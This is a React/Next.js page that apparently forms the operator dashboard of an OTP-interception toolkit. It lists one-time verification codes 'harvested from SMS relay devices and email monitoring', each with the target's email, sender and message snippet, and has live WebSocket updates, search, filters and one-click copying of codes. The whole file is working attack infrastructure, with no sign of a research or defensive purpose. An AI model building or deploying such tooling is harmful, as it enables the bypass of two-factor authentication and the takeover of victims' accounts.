"use client";

import { useEffect, useState, useMemo } from "react";
import {
  KeyRound,
  Search,
  Copy,
  Check,
  Smartphone,
  Mail,
  RefreshCw,
  Inbox,
} from "lucide-react";
import { api, LIVE_WS_URL } from "@/lib/api";
import type { CapturedOTPRecord, LiveEvent } from "@/lib/types";

export default function CapturedOtpsPage() {
  const [otps, setOtps] = useState<CapturedOTPRecord[]>([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState("");
  const [channelFilter, setChannelFilter] = useState<"all" | "sms" | "email">("all");
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const fetchOtps = async () => {
    setLoading(true);
    try {
      const data = await api.getCapturedOtps(0, 200);
      setOtps(data);
    } catch (err) {
      console.error("Failed to fetch OTPs:", err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchOtps();

    // Listen for live OTP events to append live
    const ws = new WebSocket(LIVE_WS_URL);
    ws.onmessage = (event) => {
      try {
        const payload = JSON.parse(event.data as string) as LiveEvent;
        if (payload.type === "new_otp") {
          const newRecord: CapturedOTPRecord = {
            id: payload.otp.id,
            target_id: payload.target_id,
            target_email: payload.target_email,
            session_id: null,
            sender: payload.otp.sender,
            subject: null,
            body_snippet: payload.otp.snippet,
            extracted_code: payload.otp.code,
            confidence: "1.0",
            channel: "sms",
            received_at: payload.otp.received_at,
            is_read: false,
          };
          setOtps((prev) => [newRecord, ...prev.filter((o) => o.id !== newRecord.id)]);
        } else if (payload.type === "otp_captured") {
          const newRecord: CapturedOTPRecord = {
            id: crypto.randomUUID(),
            target_id: payload.target_id,
            target_email: payload.target_email,
            session_id: payload.session_id,
            sender: payload.sender,
            subject: payload.subject,
            body_snippet: null,
            extracted_code: payload.extracted_code,
            confidence: payload.confidence,
            channel: "email",
            received_at: payload.captured_at,
            is_read: false,
          };
          setOtps((prev) => [newRecord, ...prev]);
        }
      } catch {
        // ignore non-json
      }
    };

    return () => {
      ws.close();
    };
  }, []);

  const handleCopy = (code: string, id: string) => {
    navigator.clipboard.writeText(code);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const filtered = useMemo(() => {
    return otps.filter((o) => {
      if (channelFilter !== "all" && o.channel !== channelFilter) return false;
      if (!search.trim()) return true;
      const q = search.toLowerCase();
      return (
        o.extracted_code.toLowerCase().includes(q) ||
        (o.target_email && o.target_email.toLowerCase().includes(q)) ||
        (o.sender && o.sender.toLowerCase().includes(q)) ||
        (o.body_snippet && o.body_snippet.toLowerCase().includes(q)) ||
        (o.subject && o.subject.toLowerCase().includes(q))
      );
    });
  }, [otps, search, channelFilter]);

  return (
    <div className="space-y-6">
      {/* Page Header */}
      <div className="flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between">
        <div>
          <h1 className="text-2xl font-semibold tracking-tight text-zinc-900 dark:text-zinc-50">
            Captured OTPs
          </h1>
          <p className="mt-1 text-sm text-zinc-500 dark:text-zinc-400">
            All verification codes harvested from SMS relay devices and email monitoring.
          </p>
        </div>
        <button
          type="button"
          onClick={fetchOtps}
          disabled={loading}
          className="inline-flex items-center gap-2 rounded-lg border border-zinc-200 bg-white px-3.5 py-2 text-xs font-medium text-zinc-700 shadow-sm transition-colors hover:bg-zinc-50 dark:border-zinc-800 dark:bg-zinc-900 dark:text-zinc-300 dark:hover:bg-zinc-800"
        >
          <RefreshCw className={`h-3.5 w-3.5 ${loading ? "animate-spin" : ""}`} />
          Refresh
        </button>
      </div>

      {/* Filters & Search */}
      <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
        <div className="relative flex-1">
          <Search className="absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-zinc-400" />
          <input
            type="text"
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            placeholder="Search code, email, sender, body..."
            className="w-full rounded-lg border border-zinc-200 bg-white pl-9 pr-4 py-2 text-xs text-zinc-900 placeholder:text-zinc-400 focus:border-zinc-400 focus:outline-none dark:border-zinc-800 dark:bg-zinc-900 dark:text-zinc-100 dark:placeholder:text-zinc-500"
          />
        </div>

        <div className="flex items-center gap-1.5 rounded-lg border border-zinc-200 bg-white p-1 dark:border-zinc-800 dark:bg-zinc-900">
          {(
            [
              ["all", "All"],
              ["sms", "SMS"],
              ["email", "Email"],
            ] as const
          ).map(([val, label]) => (
            <button
              key={val}
              type="button"
              onClick={() => setChannelFilter(val)}
              className={`rounded-md px-3 py-1 text-xs font-medium transition-colors ${
                channelFilter === val
                  ? "bg-zinc-900 text-zinc-50 dark:bg-zinc-100 dark:text-zinc-900"
                  : "text-zinc-500 hover:text-zinc-900 dark:text-zinc-400 dark:hover:text-zinc-100"
              }`}
            >
              {label}
            </button>
          ))}
        </div>
      </div>

      {/* OTP Table / Card List */}
      <div className="overflow-hidden rounded-xl border border-zinc-200 bg-white shadow-sm dark:border-zinc-800 dark:bg-zinc-900">
        {loading && otps.length === 0 ? (
          <div className="py-16 text-center text-sm text-zinc-500">
            <RefreshCw className="mx-auto h-6 w-6 animate-spin opacity-40 mb-2" />
            Loading captured OTP records...
          </div>
        ) : filtered.length === 0 ? (
          <div className="py-16 text-center text-sm text-zinc-500 dark:text-zinc-400 flex flex-col items-center gap-2">
            <Inbox className="h-8 w-8 opacity-30" />
            <span>No captured OTPs found matching criteria.</span>
          </div>
        ) : (
          <div className="divide-y divide-zinc-200 dark:divide-zinc-800">
            {filtered.map((item) => (
              <div
                key={item.id}
                className="flex flex-col gap-3 p-4 sm:flex-row sm:items-center sm:justify-between transition-colors hover:bg-zinc-50/50 dark:hover:bg-zinc-800/50"
              >
                <div className="flex items-start gap-3 min-w-0">
                  <div className="mt-0.5 rounded-lg bg-emerald-50 p-2 dark:bg-emerald-950/40">
                    <KeyRound className="h-5 w-5 text-emerald-600 dark:text-emerald-400" />
                  </div>
                  <div className="min-w-0 space-y-1">
                    <div className="flex flex-wrap items-center gap-2">
                      <span className="font-mono text-lg font-bold text-zinc-900 dark:text-zinc-50">
                        {item.extracted_code}
                      </span>
                      <button
                        type="button"
                        onClick={() => handleCopy(item.extracted_code, item.id)}
                        className="inline-flex items-center gap-1 rounded bg-zinc-100 px-2 py-0.5 text-[11px] font-medium text-zinc-600 hover:bg-zinc-200 dark:bg-zinc-800 dark:text-zinc-300 dark:hover:bg-zinc-700 transition-colors"
                      >
                        {copiedId === item.id ? (
                          <>
                            <Check className="h-3 w-3 text-emerald-500" />
                            Copied!
                          </>
                        ) : (
                          <>
                            <Copy className="h-3 w-3" />
                            Copy
                          </>
                        )}
                      </button>

                      {/* Channel Badge */}
                      {item.channel === "sms" ? (
                        <span className="inline-flex items-center gap-1 rounded-full bg-violet-100 px-2 py-0.5 text-[10px] font-medium text-violet-700 dark:bg-violet-900/40 dark:text-violet-300">
                          <Smartphone className="h-3 w-3" />
                          SMS Relay
                        </span>
                      ) : (
                        <span className="inline-flex items-center gap-1 rounded-full bg-sky-100 px-2 py-0.5 text-[10px] font-medium text-sky-700 dark:bg-sky-900/40 dark:text-sky-300">
                          <Mail className="h-3 w-3" />
                          Email
                        </span>
                      )}
                    </div>

                    <p className="truncate text-xs font-medium text-zinc-700 dark:text-zinc-300">
                      Target: {item.target_email || "Unattributed"}
                      {item.sender && (
                        <span className="ml-2 text-zinc-400 dark:text-zinc-500">
                          From: {item.sender}
                        </span>
                      )}
                    </p>

                    {(item.body_snippet || item.subject) && (
                      <p className="line-clamp-2 text-xs text-zinc-500 dark:text-zinc-400">
                        {item.body_snippet || item.subject}
                      </p>
                    )}
                  </div>
                </div>

                <div className="flex items-center justify-between sm:flex-col sm:items-end gap-1 text-xs text-zinc-400 dark:text-zinc-500 shrink-0">
                  <span>
                    {new Date(item.received_at).toLocaleString(undefined, {
                      dateStyle: "short",
                      timeStyle: "medium",
                    })}
                  </span>
                  {item.confidence && (
                    <span className="rounded bg-zinc-100 px-1.5 py-0.5 text-[10px] text-zinc-500 dark:bg-zinc-800 dark:text-zinc-400">
                      {Math.round(Number(item.confidence) * 100)}% conf
                    </span>
                  )}
                </div>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}
